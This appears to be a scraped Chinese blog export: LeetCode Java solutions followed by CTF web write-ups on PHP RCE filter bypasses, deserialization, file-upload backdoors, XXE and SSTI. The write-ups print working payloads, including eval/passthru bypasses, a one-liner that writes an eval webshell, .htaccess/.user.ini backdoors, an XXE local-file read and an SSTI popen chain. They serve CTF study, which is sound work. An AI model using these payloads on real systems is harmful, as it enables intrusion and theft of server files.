从前序与中序遍历序列构造二叉树根据一棵树的前序遍历与中序遍历构造二叉树。\n注意:你可以假设树中没有重复的元素。\n例如，给出\n前序遍历 preorder &#x3D; [3,9,20,15,7]中序遍历 inorder &#x3D; [9,3,15,20,7]返回如下的二叉树：\n​\t3\n   &#x2F;   9  20    &#x2F;     15   7\n\n直接看题解好的吧！\n/** * Definition for a binary tree node. * public class TreeNode &#123; *     int val; *     TreeNode left; *     TreeNode right; *     TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123;    /**    递归    前序遍历： 根  左   右    中序遍历：  左  根  右    那么，我们可以    确定根， 确定左子树    确定右子树    一直到最底部，返回空    返回根节点    返回根节点  返回根节点  返回根节点    */    private Map&lt;Integer,Integer&gt; indexmap;    public TreeNode buildTree(int[] preorder, int[] inorder) &#123;        //构造哈希映射        int n = inorder.length;        //确定 位于中序遍历的子树   有多少个节点        indexmap = new HashMap&lt;Integer,Integer&gt;();        for(int i=0;i&lt;n;i++)&#123;            indexmap.put(inorder[i],i);        &#125;        return liduoan_buildTree(preorder,inorder,0,n-1,0,n-1);    &#125;    public TreeNode liduoan_buildTree(int[] preorder,int[] inorder,int preleft,int preright,int inorder_left,int inorder_right)&#123;        if(preleft&gt;preright)            return null;                //确定根节点位置——依靠前序遍历        //在中序遍历中确定根节点位置        //通过根节点确定左子树长度        int pre_root = preleft;        int order_root = indexmap.get(preorder[preleft]);        //建立节点  关键地方        TreeNode root = new TreeNode(preorder[pre_root]);        //确定左子树的长度        int size_left_tree = order_root - inorder_left;        //前序遍历左子树初始    左子树末尾  中序遍历左边    中序遍历左子树最后        root.left = liduoan_buildTree(preorder,inorder,preleft+1,preleft+size_left_tree,inorder_left,order_root-1);        root.right = liduoan_buildTree(preorder,inorder,preleft+size_left_tree+1,preright,order_root+1,inorder_right);        return root;            &#125;&#125;\n\n2020.05.2376. 最小覆盖子串难度困难513\n给你一个字符串 S、一个字符串 T，请在字符串 S 里面找出：包含 T 所有字符的最小子串。\n示例：\n输入: S = &quot;ADOBECODEBANC&quot;, T = &quot;ABC&quot;输出: &quot;BANC&quot;\n\n\n滑动窗口\n维护一个窗口，不断滑动，然后更新答案。\n算法的大致逻辑：\nint left = 0; int right = 0;while(right&lt;s.size())&#123;//增大窗口windows.add(s[right]);right++;//缩小窗口while(windows needs shrink)&#123;\twindows.remove(s[left]);\tleft++;&#125;&#125; \n\n这道题目的算法逻辑：\n1、我们在s中使用左右指针技巧，初始化left&#x3D;right&#x3D;0，把索引左闭右开区间称为一个窗口\n2、不断增加right来扩大窗口，直到符合字符串\n3、停止增加right，然后增加left来缩小窗口\n4、重复2、3步，直到s的尽头\n\nclass Solution &#123;    public String minWindow(String s, String t) &#123;        //首先定下窗口和t字符        HashMap&lt;Character,Integer&gt; needs = new HashMap&lt;&gt;();        HashMap&lt;Character,Integer&gt; windows = new HashMap&lt;&gt;();        //配置needs        for(int i=0;i&lt;t.length();i++)&#123;            char temp = t.charAt(i);            needs.put(temp,needs.getOrDefault(temp,0)+1);        &#125;        //定义左右窗口节点和最值大小        int left=0,right=0,minLen=Integer.MAX_VALUE;        //定义count 确保满足条件窗口        int count=0;        //确定最后取值的范围        int start=0,end=0;        while(right&lt;s.length())&#123;            //增加窗口            char temp = s.charAt(right);            if(needs.containsKey(temp))&#123;                windows.put(temp,windows.getOrDefault(temp,0)+1);                if(windows.get(temp).compareTo(needs.get(temp))==0)&#123;                    count++;                &#125;            &#125;            right++;            //缩小窗口            while(count==needs.size())&#123;                //改变minlen                if(right-left&lt;minLen)&#123;                    start = left;                    end = right;                    minLen = right-left;                &#125;                //开始缩小窗口                char noneed = s.charAt(left);                if(needs.containsKey(noneed))&#123;                    windows.put(noneed,windows.get(noneed)-1);                    if(windows.get(noneed).compareTo(needs.get(noneed))&lt;0)&#123;                        count--;                    &#125;                &#125;                left++;//缩小一次                //接着向左边移动            &#125;        &#125;        return minLen==Integer.MAX_VALUE? &quot;&quot;:s.substring(start,end);    &#125;&#125;\n\n\n\n\n\n","categories":["leetcode——每日一题"]},{"title":"CTFTF_RCE专题","url":"/2020/04/14/%E5%9B%9B%E6%9C%88/CTFTF-RCE%E4%B8%93%E9%A2%98/","content":"2020.04.14今天写了写CTF.show的题目\n遇到了一大堆的RCE的题目\n有些操作没见到过。写一写\n其实好多都可知利用无参RCE直接写出来的。先回顾一下读取的函数吧\nfile_get_contents()\nprint_r\nhighlight_file\necho\n这些都尤其的经常使用\n\n\n再说说几乎可以过大多数的RCE方法\n无参RCE\n下面是payload：\nfile_get_contents(next(array_reverse(scandir(pos(localeconv())))))\npos(localeconv()):获得点’.’\nscandir():获取当前目录有啥\narray_reverse:键值反转\n再来说说这些题目：\nweb9if(preg_match(&quot;/system|exec|highlight/i&quot;,$c))&#123;                eval($c);&#125;\n\n要求使用里边三个函数来操作！\n补充一下exec函数的知识\n\nweb10&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123;        $c = $_GET[&#x27;c&#x27;];        if(!preg_match(&quot;/system|exec|highlight/i&quot;,$c))&#123;                eval($c);        &#125;else&#123;            die(&quot;cmd error&quot;);        &#125;&#125;else&#123;        highlight_file(__FILE__);&#125;?&gt;\n\n很清晰 过滤了一些函数。但是没有过滤file_get_contnts()！\n所以，payload:print_r(file_get_contents(&#39;config.php&#39;));\n第二种方法，使用动态调用 注意 这是绕过的一个好方法\n?c=$a=&#39;sys&#39;;$b=&#39;tem&#39;;$d=$a.$b;$d(&#39;cat config.php&#39;);flag需要右键查看源代码。\nweb11禁用了cat 还有好多的命令！\n例如echo  或者 利用ca&#39;&#39;t过滤\n这里是因为 再Linux命令中， &#39;&#39;可以绕过！\nweb12  这里是代码注入！不是命令执行！\n所以我们的命令是可以进行编码绕过的！这很关键！\n&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123;        $c = $_GET[&#x27;c&#x27;];        if(!preg_match(&quot;/system|exec|highlight|cat|\\.|php|config/i&quot;,$c))&#123;                   eval($c);        &#125;else&#123;            die(&quot;cmd error&quot;);        &#125;&#125;else&#123;        highlight_file(__FILE__);&#125;?&gt;\n\n$a = base64_decode(&#39;c3lzdGVt&#39;);      这里编码system\n$b=base64_decode(&#39;Y2F0IGNvbmZpZy5waHA=&#39;);    这里编码命令 \n$a($b);     动态调用代码！\n同时还有一种方法：\n在Linux中反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量。比如 cat ls 相当于将 ls出来的结果cat\n?c=passthru(&quot; ca&#x27;&#x27;t `ls`&quot;);这里passthru  又是一个系统命令执行的函数！ 所以不是只有system啊！如果把分号过滤了c=passthru(&quot;ca&#x27;&#x27;t `ls`&quot;)?&gt;c=assert(base64_decode(%27c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp%27))?&gt;\n\nweb13先看看代码\n&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123;        $c = $_GET[&#x27;c&#x27;];        if(!preg_match(&quot;/system|exec|highlight|cat|\\(|\\.|\\;|file|php|config/i&quot;,$c))&#123;                eval($c);        &#125;else&#123;            die(&quot;cmd error&quot;);        &#125;&#125;else&#123;        highlight_file(__FILE__);&#125;?&gt;\n\n注意代码注入！\n恶心的把小括号都过滤了！ 那咋办嘛\n这又有一个新方法！\n?c=echo `$_POST[1]`?&gt;\n\n然后再post传入\n 1=cat config.php\n备注：\n大都时候我们使用system()等函数执行系统命令，在一些的严格正则匹配情况下，过滤掉了大多数的命令执行函数，但是PHP有执行运算符，也就是反引号，和shell_exec() system()一样，可以执行系统命令。\nhttps://www.php.net/manual/zh/language.operators.execution.php\n但是，反引号执行却没有任何回显\n这也就是为什么前面需要用到echo函数！\nweb15先看代码\n&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123;        $c = $_GET[&#x27;c&#x27;];        if(!preg_match(&quot;/system|\\\\*|\\?|\\&lt;|\\&gt;|\\=|exec|highlight|cat|\\(|\\.|file|php|config/i&quot;,$c))&#123;            //特殊符号  *？&lt;&gt; = ( .             //函数  system exec highlight             //命令  cat             //名字  file php comnfig             eval($c);        &#125;else&#123;            die(&quot;cmd error&quot;);        &#125;&#125;else&#123;        highlight_file(__FILE__);&#125;?&gt;\n\n1、编码绕过  因为过滤了(  所以大多数的函数都用不了\n2、执行系统命令 反引号 echo 输出 echo没绕过\n3、名字过滤 利用POST传参\nPOST /?c=echo%20`$_POST[2]`;   HTTP/1.12=cat `ls`\n\n如果想直接输出目录下！ 请用上述的方法！\n总结一下\n动态调用\n无参RCE \nPOST传参\n反引号命令执行\nshell里面’’无用\n今天就写到这吧\n好迷茫啊。到底应该学什么！！！！\n","categories":["刷题"],"tags":["刷题"]},{"title":"NPUCTF-WP","url":"/2020/04/24/%E5%9B%9B%E6%9C%88/NPUCTF-WP/","content":"NPUCTF   4.18-4.21很真实的运维赛，【滑稽\nweb题好难。好吧是我太菜啦\n就写出来两道题目。。\n\n\n审查源码F5 鼠标右键不行\n直接view-source:url就行了\n甚至你还可以抓包来看。\n[NPUCTF2020]ReadlezPHP这道题目有点坑。不过也确实学到了东西\n考点： 代码注入 反序列化  \n查看源码知道\n\n那么我们打开看到源码：\n&lt;?php#error_reporting(0);class HelloPhp&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;        $this-&gt;b = &quot;date&quot;;    &#125;    public function __destruct()&#123;        $a = $this-&gt;a;        $b = $this-&gt;b;        echo $b($a);    &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123;    highlight_file(__FILE__);    die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]);\n\n很明显的反序列化执行。这里的构造函数__construce()在反序列化的时候是不会执行的，所以不必担心。\n那么下面就是代码注入的环节了。我发现他禁掉了好多的函数。\n最后测试出来使用 assert来进行代码注入。\n先利用assert(&quot;phpinfo();&quot;);来看看被禁掉了哪些函数\n\n确实 大多数的执行系统命令的函数都被过滤了。。\n按照惯例，先看下目录。 这里不能使用系统命令。所以我们使用scandir函数\n\n查看文件内容，除了系统命令，那就直接file_get_contents()来进行\n结果查出来的是个假的flag。真的无聊。\n然后我还翻遍大部分的文件。。\n最后想着有没有可能在phpinfo中有。然后查询一下。。。果然\n小tips：flag有可能会在phpinfo中，以后找到可以先查查看看。\n方法二看了天璇的wp\n发现可以写马进去\n具体利用方法\nfile_put_contents(&quot;eki.php&quot;, &quot;&lt;?php eval(\\$_REQUEST[\\&#x27;cmd\\&#x27;]); ?&gt;&quot;)\n\n但是eval被禁止了呀。然而蚁剑的插件似乎可以绕过disabled_function\nhttps://www.anquanke.com/post/id/195686?from=timeline\nezinclude这是一位师傅的wp\n不太懂。。 我得去学学hash扩展攻击\n\n第一层又双叒叕是一个hash拓展攻击，没有长度就爆破一下\n利用 upload_progress\nimport requestsimport hashpumpyimport urlliburl=&#x27;http://ha1cyon-ctf.fun:30004/&#x27;for i in range(40):    a,b=hashpumpy.hashpump(&#x27;a3dabbc779f2fbf8b6f56113ca78a7f9&#x27;,&#x27;123444&#x27;,&#x27;1&#x27;,i)    req=requests.get(url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a))    if &#x27;username/password error&#x27; not in req.text:        print(req.text,url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a))        \n\n跳到\nflflflflag.php\n\n可以文件包含\n这里是用 upload_progress来写shell，然后包含\n\n然后包含&#x2F;tmp&#x2F;m0on getshell，好像flag又是在phpinfo里面，根目录的是假的\nflag:\nflag{6b671cf1-9558-47f6-9cd2-46ff8e32a3e9}\n安恒的 Ezunserialize一进去，直接源码：\n&lt;?php//show_source(&quot;test.php&quot;);//写函数function write($data) &#123;    //chr(0)==NULL    return str_replace(chr(0) . &#x27;*&#x27; . chr(0), &#x27;\\0\\0\\0&#x27;, $data);&#125;//读函数function read($data) &#123;    return str_replace(&#x27;\\0\\0\\0&#x27;, chr(0) . &#x27;*&#x27; . chr(0), $data);&#125;class A&#123;    //构造函数确定    public $username;    public $password;    function __construct($a, $b)&#123;        $this-&gt;username = $a;        $this-&gt;password = $b;    &#125;&#125;class B&#123;    //析构函数输出    public $b=&#x27;gay&#x27;;    function __construct($a)&#123;        $this-&gt;b = $a;    &#125;    function __destruct()&#123;        $c = &#x27;a&#x27;.$this-&gt;b;        echo $c;    &#125;&#125;class C&#123;    //这里利用字符串输出文件  需要一个echo调用——toString    // B类析构函数可以这样  也就是说 B类中的是    //从A类进去    public $c;    function __toString()&#123;        //flag.php        echo file_get_contents($this-&gt;c);        return &#x27;nice&#x27;;    &#125;&#125;$a = new A($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;]);//省略了存储序列化数据的过程,下面是取出来并反序列化的操作$b = unserialize(read(write(serialize($a))));\n\n那么思路挺清楚的。A类一开始赋值。之后序列化A类，再反序列化A类。\n那么就应该是 在赋值A类的时候，是字符串。在反序列化的时候，把字符串返回来的时候也要把B类给反序列化出来。\n可是序列化A类之后的字符串是：\nstring(116) &quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;li&quot;;s:8:&quot;password&quot;;s:57:&quot;;&#125;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;       &quot;%00;&#125;&quot;也就是O:1:&quot;A&quot;:2&#123;s:8:&quot;username&quot;;s:2:&quot;li&quot;;s:8:&quot;password&quot;;s:57:&quot;;&#125;   //这里字符数限制了反序列化解析的时候字符控制，O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;%00&quot;;&#125;\n\n他这里 我们在GET参数进去的时候就已经确定了自己是字符串。\n那么在序列化的时候，也确实两者是字符串。\n所以我们的目的是改变他认为这个是字符串！！\n\n按照颖奇师傅的wp\n我们要这么构造pop链\n$a = new A();$b = new B();$c = new C();$c-&gt;c=&quot;flag.php&quot;;$b-&gt;b=$c;$a-&gt;username=&quot;1&quot;;$a-&gt;password=$b;echo serialize($a);\n\n这样之后就可以得到序列化后的字符串\n\n即是：O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;\n分解一下看一下：\nO:1:&quot;A&quot;:2:&#123;                   头类s:8:&quot;username&quot;;\t\t\t\t属性s:1:&quot;1&quot;;\t\t\t\t\t字符串值s:8:&quot;password&quot;;\t\t\t\t属性O:1:&quot;B&quot;:1:&#123;\t\t\t\t\t类\ts:1:&quot;b&quot;;\t\t\t\t\tO:1:&quot;C&quot;:1:&#123;\t\t\t\t\t\ts:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;\t\t&#125;\t&#125;&#125;\n\n但是我们输入的时候会被默认字符串 也就是说 不能被解析为类！ 这咋办呢？\n字符逃逸d这里的字符逃逸是怎么回事呢？\n看看write和read的代码先:\n//写函数function write($data) &#123;    //chr(0)==NULL    //如果有*的话 就改成 \\0\\0\\0      //也就是说 三个字符变成 6个字符 拉长了    return str_replace(chr(0) . &#x27;*&#x27; . chr(0), &#x27;\\0\\0\\0&#x27;, $data);&#125;//读函数function read($data) &#123;\t// //入宫有\\0\\0\\0 那么我们就替换成 .*.这样的形式  \t//这个可以让我们把6个字符变成3个字符    //牛逼    return str_replace(&#x27;\\0\\0\\0&#x27;, chr(0) . &#x27;*&#x27; . chr(0), $data);&#125;\n\n这里我们看看\\0\\0\\0和另外一个的字符长度！\nstring(6) &quot;\\0\\0\\0&quot;string(3) &quot;*&quot;\n\n这里说 前者占6个字符的位置，后者占3个字符的位置。\n那么这就是字符逃逸了呀！\n借用颖奇师傅的wp用一下\n\n那么我们的大致思路就有了。利用read函数把6个字符减半的特点。\n我们可以实现反序列化字符逃逸。\n真的牛逼。服气了，我当时根本没有理会那两个函数。。\n","categories":["刷题"]},{"title":"四月份安全-2","url":"/2020/04/08/%E5%9B%9B%E6%9C%88/%E5%9B%9B%E6%9C%88%E4%BB%BD%E5%AE%89%E5%85%A8-2/","content":"2020.04.07今天是因为身体不行了，然后有学了两个小时的php开发。\n所以没多少时间写了。。\n明天补上！\n2020.04.08[HCTF 2018]admin首先直接进去后。\n查看源码：有注释你不是admin用户\n说明如果是admin用户就可以得到flag了\n然后注册登陆。可以看到有一个注释，是源码的地址。\n然后我就不会了\n他是python的flask的漏洞和源码审计。。\n还有seeesion的问题。是个可以被解密的签证。\n我傻了。留着吧。 \n主要参考：\nhttps://www.cnblogs.com/chrysanthemum/p/11722351.html\nhttps://xz.aliyun.com/t/3569#toc-0\nhttps://www.leavesongs.com/PENETRATION/client-session-security.html\nhttps://cizixs.com/2017/03/08/flask-insight-session/\n\n\n2020.04.09[RoarCTF 2019]Easy Calc这道题目有趣多了\n学到的知识点\n1、如果我们的单引号和双引号被过滤了\n我们怎么输入字符串？\n​\t1）、chr()\n​\t\t\tchr ( int $ascii) : string:返回指定的字符\n​\t2）、hex2bin ( string $data ) : string\n​\t\t\t：把十六进制字符串转化为二进制字符串\n​\t\t\tdechex ( int $number) : string\t\n​\t\t\t：十进制数字转化为十六进制字符串\n2、如何查看当前目录下有什么。除了直接使用system()\n​\t\tscandir ( string $directory [, int $sorting_order [, resource $context ]] ) : array\n​\t\t返回一个数组。数组里包含directory中的文件和目录\n3、PHP字符串解析\n​\t\t\n字符串解析\nPHP查询字符串（在URL或正文中）转化为内部$_GET或$_POST数组时，例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：\n/news.php?%20news[id%00=42&quot;+AND+1=0--\nPHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：\n1.删除空白符\n2.将某些字符转换为下划线（包括空格）\n\n这也是为什么上一篇有一道题目\n他过滤了下划线，而变量名字为b_u_r_p\n我们可以利用 b%20u%20r%20p来成功输入变量\n好了基本知识点都知道了\n我们来解解题目\n测试发现，输入只能是数字和特殊字符，不允许使用字母\n这里就是利用PHP字符串解析了。\n假如waf不允许num变量传递字母：\nhttp://www.xxx.com/index.php?num = aaaa   //显示非法输入的话那么我们可以在num前加个空格：\nhttp://www.xxx.com/index.php? num = aaaa这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。\n但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。\n至于是怎么发现是这个的。。。我哪知道啊。\n之后 我们审查一下calc.php\n&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123;    show_source(__FILE__);&#125;else&#123;        $str = $_GET[&#x27;num&#x27;];        $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;];        foreach ($blacklist as $blackitem) &#123;                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;                        die(&quot;what are you want to do?&quot;);                &#125;        &#125;        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt;\n\n看的出来，它过滤了 空格   单引号   双引号  换行  [   ]   $  \\  ^\n还好没有过滤 (   )。那么我们可以利用很多了\nascii码表查找：http://ascii.911cha.com/\n不就是不给直接输入字符串嘛！\n然后我尝试payload?%20num=2;system(chr(108).chr(115))\n结果不能出来目录。还记得上次无参RCE使用的scandir()函数\n然后使用?%20num=2;var_dump(scandir(chr(47)))直接扫根目录\n一般flag都在根目录里面\n那么后面的操作就容易了\n?%20num=2;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) \n不说了，另外一种http走私不会。。就这样，等刷完BUU我再刷第二遍的时候\n就精细一点。！\n参考：https://www.cnblogs.com/chrysanthemum/p/11757363.html\n参考里有很多的参考【？？套娃【笑   \n[SUCTF 2019]CheckIn文件上传题目\n新的利用点 ——**.user.ini**\n整理下文件上传题的步骤：\n随意上传php\nfuzz后缀测试【可后面再做\n改未知扩展名如.aaa来判断是黑名单还是白名单\n之后再判断&lt;?问题\n再判断MIME问题\n文件头问题\n有一个经常可以通过的&lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;aaa&#39;]);&lt;scirpt&gt;\n黑名单过滤而且可以上传图片马，那我们首先想到的肯定是传一个.htaccess上去来将图片马解析为php\n这个方法是.htaccess文件内容为\n&lt;FilesMatch &quot;jpg&quot;&gt;     SetHandler application/x-httpd-php&lt;/FilesMatch&gt;\n\n除此之外还有一个.user.ini的方法\n\n也就是说我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置，而且只要是在使用 CGI／FastCGI 模式的服务器上都可以使用.user.ini\n在p牛的文章中提到了两个有趣的设置：auto_prepend_file和auto_append_file\n\n大致意思就是：我们指定一个文件（如liduoan.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./liduoan.jpg);\n这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）\n那么我们在.user.ini文件中写入\nGIF89aauto_preprnd_file=liduoan.jpg\n\n这样，在我们访问某个php文件的时候，liduoan.jpg就会被插入在这个php文件前面。那么liduoan.jpg的php代码不就可以执行了？！\n好了，讲讲**.user.ini**的利用条件\n\n服务器脚本为PHP\n服务器使用CGI&#x2F;FastCGI模式\n上传目录下要有可执行的php文件\n\n优势： 和**.htaccess**后门比，范围更加广，nginx&#x2F;apache&#x2F;IIS都有效。而.htaccess只对apache有效\n注意和利用.htaccess的差别，在解题中最重要的是上传目录文件夹下有可执行的脚本。\n具体解题步骤\n上传.user.ini  liduoan.jpg文件\n\n之后蚁剑连接/uploads/76d9f00467e5ee6abc3ca60892ef304e/index.php\n根目录查看flag 【全都是在根目录。。。\n参考：https://xz.aliyun.com/t/6091#toc-1\n2020.04.16[极客大挑战 2019]RCE ME","categories":["刷题"]},{"title":"四月份web-1.0","url":"/2020/04/01/%E5%9B%9B%E6%9C%88/%E5%9B%9B%E6%9C%88%E4%BB%BD%E5%AE%89%E5%85%A8/","content":"2020.04.01NCTF-Fake XML cookbook这道题目是校赛题目，有一说一，我当时没写出来。郁闷。\n整理知识点就是XXE 读取文件\npayload为：\n&lt;!DOCTYPE ANY[\t&lt;!ENTITY test SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;\t&lt;username&gt;&amp;test;&lt;/username&gt;\t&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;\n\nxxe-lib的原题 基础XXE吧。\n具体知识点看合天培训 ，那里很清楚。 主要就是读取文件赋值返回。\nez_bypass考点：MD5  弱类型比较\n这题目就很容易了\n\n\n直接看源码：\nI put something in F12 for youinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;    $id=$_GET[&#x27;id&#x27;];    $gg=$_GET[&#x27;gg&#x27;];    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;        echo &#x27;You got the first step&#x27;;        if(isset($_POST[&#x27;passwd&#x27;])) &#123;            $passwd=$_POST[&#x27;passwd&#x27;];            if (!is_numeric($passwd))            &#123;                 if($passwd==1234567)                 &#123;                     echo &#x27;Good Job!&#x27;;                     highlight_file(&#x27;flag.php&#x27;);                     die(&#x27;By Retr_0&#x27;);                 &#125;                 else                 &#123;                     echo &quot;can you think twice??&quot;;                 &#125;            &#125;            else&#123;                echo &#x27;You can not get it !&#x27;;            &#125;        &#125;        else&#123;            die(&#x27;only one way to get the flag&#x27;);        &#125;&#125;    else &#123;        echo &quot;You are not a real hacker!&quot;;    &#125;&#125;else&#123;    die(&#x27;Please input first&#x27;);&#125;&#125;\n\n需要绕过MD5  和  数字比较\nMD5 如果是==可以使用md5处理后都为0e的样子\n但是如果是===就只能利用数组  MD5数组返回NULL  两个NULL相等\nis_numeric($passwd)\n这个直接使用弱类型比较  passwd=1234567a\n2020.04.02[BJDCTF 2nd]fake google这道题目 增加知识体系了\n首先 我不会做 然后看了WP 说是利用python渲染  ssti\nhttps://xz.aliyun.com/t/3679\n然后就去学习了\nssti的详细在 ssti那篇博文上。\n说说解题过程吧\n首先 name=&#123;&#123;7*8&#125;&#125;\n\n那么一步步测试\n&#123;&#123;[].__class__.__bases__&#125;&#125;&#123;&#123;[].__class__.__bases__[0]&#125;&#125;&#123;&#123;[]。————class.__bases__[0]..__subclasses__()&#125;&#125;//找到目标类&lt;class &#x27;os.wrap_close&#x27;&gt;   这个类很有用  可以直接直线系统命令&#123;&#123;[].__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;利用命令了之后 linux命令插入  \n\n参考：https://blog.csdn.net/ChenZIDu/article/details/105159197\n[BJDCTF 2nd]old hack这道题目很像之前写合天训练赛的题目\n搜索出现有的 nday \n首先一进去\n\nthinkphp 中  可以利用 127.0.0.1/index.php/s=xxx来debug\n那么我们亦可以利用它来查看版本\n查的 think-version  5.0.23，\n之后直接查找漏洞就好了。。\n我发现大多数flag都在 根目录那里。\n\n2020.04.03[BJDCTF 2nd]假猪套天下第一这道题目 纯属靠http头\n主要考\n1、cookie 设置时间 99年  Cookie: PHPSESSID=cibo5j3ug8t8q101utm8ev1mv1;time=999999999\n2、之后XXF 伪造IP\n3、Referer 浏览器访问的前一个页面\n4、User-Agent 系统消息自带\n5、From 请求的用户的邮件地址\n6、via  由哪个代理发出\n最终效果如下 ↓\n\n然后可以看到Base64编码\n解码即可。\n[MRCTF2020]套娃考察点：函数、换行污染、file_get_contents等于某个字符串、简单的解码脚本、部分_  .  操作转换\n一进去  F12查看\n\n函数解释：\nsubstr_count(string $haystack , string $needle):\n返回子字符串needle在字符串haystack中出现的次数 其中needle区分大小写\npreg_match ( string $pattern , string $subject）：\n返回pattern匹配的次数，它的值为0次或者1次。preg_match在第一次匹配就停止搜索。\n这里的QUERY_STRING就是url&#x2F;?后面所有值\n例如：127.0.0.1/index.php?a=3&amp;b=5\n它的$_SERVER[&#39;QUERY_STRING&#39;]=a=3&amp;b=5\nY1ng师傅说 $_SERVER[&#39;QUERY_STRING&#39;]是不会URL解码\n所以一般都是用URL编码来绕过。这里ban了%5f。：\n\n%5F\nb.u.p.t（点代替_）\nb u p t（空格代替_）\n\n之后换行污染绕过。\npayload&#x3D;?b.u.p.t=23333%0a\n得到文件名字 √ :secrettw.php   ——&gt;访问\n\n首先： 这个伪造IPClient-IP:127.0.0.1  或者使用 X-Forwarded-For:127.0.0.1\nPOST 一个Merak参数   \n嗯哼 出现源码：\n&lt;?php  error_reporting(0);  include &#x27;takeip.php&#x27;; ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;);  include &#x27;flag.php&#x27;;  if(isset($_POST[&#x27;Merak&#x27;]))&#123;      highlight_file(__FILE__);      die();  //注意这里！如果POST了Merak就会Die&#125;    //重点在这个加密函数上function change($v)&#123;      $v = base64_decode($v);      $re = &#x27;&#x27;;      for($i=0;$i&lt;strlen($v);$i++)&#123;          $re .= chr ( ord ($v[$i]) + $i*2 );      &#125;    return $re;  &#125; echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;; $ip = getIp(); if($ip!=&#x27;127.0.0.1&#x27;) echo &quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;.$ip; if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123; echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]); echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125; ?&gt;  \n\n审查审查 \nIP检验，file_get_contents()等于某个字符串，一个加密\n第一层 IP检测伪造\n第二层 file_get_contents()等于特定字符串\n这道题目 CGCTF里有过\n解决方法：\n绕过方式有多种：\n\n使用php:&#x2F;&#x2F;input伪协议绕过① 将要GET的参数?xxx&#x3D;php:&#x2F;&#x2F;input② 用post方法传入想要file_get_contents()函数返回的值\n用data:&#x2F;&#x2F;伪协议绕过将url改为：?xxx&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,想要file_get_contents()函数返回的值的base64编码或者将url改为：?xxx&#x3D;data:text&#x2F;plain,(url编码的内容)\n\n这里采用 data:&#x2F;&#x2F;text&#x2F;plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk&#x3D;\n第三层写个解码脚本就好了 \n这个以前攻防世界有道类似的解码题 